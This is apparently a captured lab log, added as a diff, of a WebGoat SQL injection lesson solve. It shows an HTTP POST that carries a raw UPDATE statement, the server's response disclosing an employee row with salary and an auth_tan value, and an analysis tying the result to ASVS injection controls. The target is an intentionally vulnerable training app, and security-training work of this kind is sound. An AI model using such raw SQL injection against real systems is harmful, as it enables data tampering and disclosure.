@@ -1,0 +1,39 @@
+Lesson: SQL Injection (intro) / assignment SqlInjectionLesson3
+Captured via Chrome DevTools Network panel (live browser interaction, not guessed), Run #9, 2026-11-16T11:11:03Z
+
+### Request
+POST http://10.242.10.31:8007/WebGoat/SqlInjection/attack3 HTTP/1.1
+Referer: http://10.242.10.31:8007/WebGoat/start.mvc
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 105
+Cookie: JSESSIONID=EB5681DBBE34AF0FD5E2A4E855CBA117
+Origin: http://10.242.10.31:8007
+Host: 10.242.10.31:8007
+
+query=UPDATE+employees+SET+department+%3D+'Sales'+WHERE+first_name+%3D+'Tobi'+AND+last_name+%3D+'Barnett'
+
+### Response
+HTTP/1.1 200
+Content-Type: application/json
+Content-Length: 631
+
+{
+  "assignment" : "SqlInjectionLesson3",
+  "attemptWasMade" : true,
+  "feedback" : "Congratulations. You have successfully completed the assignment.",
+  "feedbackArgs" : null,
+  "lessonCompleted" : true,
+  "output" : "<span class='feedback-positive'>UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' AND last_name = 'Barnett'</span><table><tr><th>USERID</th><th>FIRST_NAME</th><th>LAST_NAME</th><th>DEPARTMENT</th><th>SALARY</th><th>AUTH_TAN</th></tr><tr><td>89762</td><td>Tobi</td><td>Barnett</td><td>Sales</td><td>77000</td><td>TA9LL1</td></tr></table>",
+  "outputArgs" : null
+}
+
+### Analysis
+This WebGoat lesson step grants the account intentional raw-SQL input to demonstrate SQL injection impact
+(the lesson's own design: "you have been granted full administrator privileges in this assignment").
+The server executed an arbitrary, user-supplied UPDATE statement with no parameterization, confirming
+unsanitized SQL execution (ASVS V1.2.4 - Injection Prevention / database injection). The response body
+directly echoes modified row data (Tobi Barnett's department changed to 'Sales', salary/auth_tan disclosed),
+demonstrating both integrity impact (UPDATE) and confidentiality impact (full row disclosure) within the
+lesson's own intentionally-vulnerable training data set. This is the lesson's own intended "solve" condition,
+not a destructive action against unrelated data (Section 6 guardrail compliance).
